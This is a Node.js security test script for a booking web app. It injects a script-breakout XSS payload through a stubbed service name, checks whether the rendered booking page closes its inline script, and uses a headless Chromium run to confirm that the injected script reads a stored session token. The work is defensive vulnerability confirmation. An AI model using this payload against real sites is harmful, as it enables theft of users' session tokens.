// sweep2-sec: does a provider-controlled service name break out of /book/<slug>'s inline <script>?
// Runs the REAL api/book-page.js + lib/booking.js + lib/public-brand.js with db/square/gcal/consult stubbed.
import fs from 'fs'; import os from 'os'; import path from 'path';
const V='/home/user/SlickChart/slickchart-vercel';
const t=fs.mkdtempSync(path.join(os.tmpdir(),'s2bp-')); fs.mkdirSync(t+'/api'); fs.mkdirSync(t+'/lib');
fs.copyFileSync(V+'/api/book-page.js',t+'/api/book-page.js');
for (const f of ['booking.js','public-brand.js']) fs.copyFileSync(V+'/lib/'+f,t+'/lib/'+f);
fs.writeFileSync(t+'/package.json','{"type":"module"}');
const PAYLOAD='</script><script>window.__PWNED=localStorage.sc_token</script>';
fs.writeFileSync(t+'/lib/db.js',`const KV={'sc_booking_page':JSON.stringify({on:true,mode:'request',services:[{name:${JSON.stringify(PAYLOAD)}}]}),'sc_availability':JSON.stringify({mon:{open:true,start:'09:00',end:'17:00'}})};
export function dbEnabled(){return true} export function sql(){return async()=>[]} export async function getKVValue(o,k){return KV[k]||null}`);
fs.writeFileSync(t+'/lib/consult.js',`export async function getProviderBySlug(s){return {id:'p_evil',name:'Evil'}}`);
fs.writeFileSync(t+'/lib/square.js',`export async function getConnection(){return null} export async function squareFetch(){} export async function listBookableServices(){return []} export function matchSquareService(){return null} export async function resolveLocationId(){} export async function resolveLocationTz(){} export function zonedDayRange(){} export function zonedDateKey(){}`);
fs.writeFileSync(t+'/lib/google-cal.js',`export async function getGoogleConnection(){return null} export async function googleBusyMinutes(){return null}`);
const { default: h } = await import(t+'/api/book-page.js');
let body='',status=0; const res={setHeader(){},status(s){status=s;return this},send(b){body=b}};
await h({query:{slug:'evil'}},res);
const scriptIdx=body.indexOf('var SVC=');
const line=body.slice(scriptIdx,body.indexOf('\n',scriptIdx));
console.log('status',status); console.log('SVC line:',line);
console.log(line.includes('</script><script>')?'CONFIRMED-BUG: service name closes the inline <script> and opens attacker script on slickchart.app/book/<slug>':'SOUND');
// Drive it in Chromium to prove execution on the page origin.
try{
  const pw=(await import('/opt/node22/lib/node_modules/playwright/index.js')).default;
  const b=await pw.chromium.launch({executablePath:'/opt/pw-browsers/chromium-1194/chrome-linux/chrome'});
  const p=await b.newPage();
  await p.route('https://slickchart.test/**',r=>{ if(r.request().url().includes('/book/'))return r.fulfill({status:200,contentType:'text/html',body}); return r.fulfill({status:200,contentType:'text/html',body:'<html></html>'}); });
  await p.goto('https://slickchart.test/slickchart'); await p.evaluate(()=>localStorage.setItem('sc_token','VICTIM.TOKEN'));
  await p.goto('https://slickchart.test/book/evil');
  console.log('window.__PWNED on the booking page =',await p.evaluate(()=>window.__PWNED));
  await b.close();
}catch(e){console.log('browser step skipped:',e.message)}
